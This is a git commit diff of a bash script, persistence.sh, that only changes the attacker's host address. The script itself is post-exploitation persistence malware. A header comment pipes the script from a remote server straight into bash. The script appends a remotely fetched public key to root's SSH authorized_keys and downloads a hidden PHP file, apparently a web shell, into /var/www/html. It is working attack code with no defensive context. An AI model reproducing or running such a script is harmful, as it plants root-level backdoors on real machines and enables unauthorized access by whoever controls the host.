d4b140dcdbf98440e781d8563191f60bd00a7f8c
JesusCries <62108395+WesleyWong420@users.noreply.github.com>
2022-12-21 09:02:06 -0500

    Update persistence.sh

--- persistence.sh
+++ persistence.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
-# curl 127.0.0.1:8000/persistence.sh | bash
+# curl 192.168.10.149:8000/persistence.sh | bash
 
 mkdir /root/.ssh/
 chmod 700 /root/.ssh/
-curl 127.0.0.1:8000/key.pub >> /root/.ssh/authorized_keys
+curl 192.168.10.149:8000/key.pub >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
-curl 127.0.0.1:8000/home.php -o /var/www/html/.home.php
+curl 192.168.10.149:8000/home.php -o /var/www/html/.home.php
